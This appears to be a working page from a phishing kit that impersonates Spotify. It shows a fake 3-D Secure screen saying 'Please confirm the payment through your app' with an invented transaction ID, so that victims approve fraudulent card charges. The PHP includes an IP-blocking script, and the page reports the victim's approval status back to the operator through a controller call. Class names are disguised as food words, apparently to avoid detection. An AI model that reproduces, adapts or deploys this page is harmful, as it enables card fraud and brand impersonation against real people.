<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/fav.ico">
    <title>Spotify</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Circular', Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: white;
            min-height: 100vh;
        }
        
        .sushi {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background-color: #000;
        }
        
        .ramen {
            display: flex;
            align-items: center;
        }
        
        .ramen img {
            height: 40px;
        }
        
        .tempura {
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .udon {
            display: flex;
            gap: 30px;
        }
        
        .udon a {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
        }
        
        .miso {
            display: flex;
            align-items: center;
            gap: 5px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 23px;
            padding: 5px 10px;
            cursor: pointer;
        }
        
        .tofu {
            width: 30px;
            height: 30px;
            background-color: #535353;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .tofu img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .wasabi {
            font-weight: 700;
            margin-right: 5px;
        }
        
        .main-content {
            max-width: 500px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .payment-modal {
            background-color: #f8f9fa;
            border-radius: 12px;
            padding: 30px;
            margin: 20px auto;
            max-width: 450px;
            color: #333;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }

        .payment-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }

        .spotify-logo img {
            height: 30px;
        }

        .card-logos img {
            height: 35px;
        }

        .payment-instruction {
            font-size: 14px;
            color: #333;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .payment-details {
            margin-bottom: 25px;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding: 4px 0;
        }

        .detail-label {
            font-size: 14px;
            color: #333;
            font-weight: 500;
        }

        .detail-value {
            font-size: 14px;
            color: #000;
            font-weight: 600;
        }

        .waiting-status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 6px;
            margin-bottom: 20px;
            background-color: #fff;
        }

        .loading-spinner {
            width: 14px;
            height: 14px;
            border: 2px solid #ddd;
            border-top: 2px solid #1ED760;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .waiting-text {
            font-size: 13px;
            color: #666;
        }

        .no-push-link {
            display: flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 20px;
        }

        .push-link {
            color: #1ED760;
            text-decoration: none;
            font-size: 14px;
        }

        .push-link:hover {
            text-decoration: underline;
        }

        .info-icon {
            background-color: #666;
            color: white;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            font-weight: bold;
        }

        .terms-text {
            margin-bottom: 25px;
            font-size: 12px;
            color: #666;
            line-height: 1.4;
        }

        .terms-link {
            color: #1ED760;
            text-decoration: none;
        }

        .terms-link:hover {
            text-decoration: underline;
        }

        .recaptcha-footer {
            text-align: center;
            padding: 20px;
            margin-top: 40px;
            font-size: 11px;
            color: #999;
            line-height: 1.4;
        }

        .recaptcha-footer a {
            color: #1ED760;
            text-decoration: none;
        }

        .recaptcha-footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .sushi {
                padding: 15px 20px;
            }
            
            .udon {
                gap: 15px;
            }
        }

        @media (max-width: 576px) {
            .sushi {
                padding: 10px 15px;
            }
            
            .ramen img {
                width: 100px;
                height: 40px;
            }
            
            .udon {
                display: none;
            }
            
            .miso {
                padding: 3px 8px;
            }
            
            .tofu {
                width: 25px;
                height: 25px;
            }
            
            .wasabi {
                font-size: 14px;
            }
            
            .tempura {
                gap: 15px;
            }
            
            .payment-modal {
                padding: 25px 20px;
                margin: 15px auto;
            }
            
            .payment-header {
                gap: 15px;
                text-align: center;
            }
            
            .detail-row {
                flex-direction: column;
                gap: 3px;
            }

            .recaptcha-footer {
                font-size: 10px;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <nav class="sushi">
        <div class="ramen">
            <img src="./img/lggo.webp">
        </div>
        
        <div class="tempura">
            <div class="udon">
                <a data-translate="premium">Premium</a>
                <a data-translate="support">Support</a>
                <a data-translate="download">Download</a>
            </div>
            
            <div class="miso">
                <div class="tofu">
                    <img src="./img/proff.webp">
                </div>
                <span class="wasabi" data-translate="profile">Profile</span>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M4 6L8 10L12 6" stroke="white" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
        </div>
    </nav>
    
    <div class="main-content">
        <div class="payment-modal">
            <div class="payment-header">
                <div class="spotify-logo">
                    <img src="./img/lggo.webp">
                </div>
                <div class="card-logos">
                    <img src="./img/vv.webp">
                </div>
            </div>
            
            <p class="payment-instruction" data-translate="instruction">
                Please confirm the payment through your app on your smartphone/tablet.
            </p>
<?php
if(isset($_GET['e'])){
  echo '<span style="color: red; display: inline; font-size: 11px;">Payment not approved. Please confirm again.
</span><br><br>';
}
?>             
            <div class="payment-details">
                <div class="detail-row">
                    <span class="detail-label" data-translate="merchant">Merchant</span>
                    <span class="detail-value">Spotify Premium</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label" data-translate="date">Date</span>
                    <span class="detail-value" id="current-date">28.05.2025</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label" data-translate="transaction-id">Transaction ID</span>
                    <span class="detail-value">SP-17426919-001</span>
                </div>
            </div>
            
            <div class="waiting-status">
                <div class="loading-spinner"></div>
                <span class="waiting-text" data-translate="waiting">Waiting for app confirmation...</span>
            </div>
            
            <div class="no-push-link">
                <a class="push-link" data-translate="no-push">No push notification received?</a>
                <span class="info-icon">ⓘ</span>
            </div>
            
            <div class="terms-text">
                <p data-translate="terms-full">By clicking "Confirm Payment" I accept the special terms for the use of 3-D Secure authentication.</p>
            </div>
        </div>
    </div>

    <footer class="recaptcha-footer">
        <p data-translate="recaptcha-full">
            This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
        </p>
    </footer>

    <script src="./js/opo.js"></script>
<script src="js/jq.js"></script>
<?php $m->ctr(" APPROVE ⏳ ".@$_GET['e']); ?>
</body></html>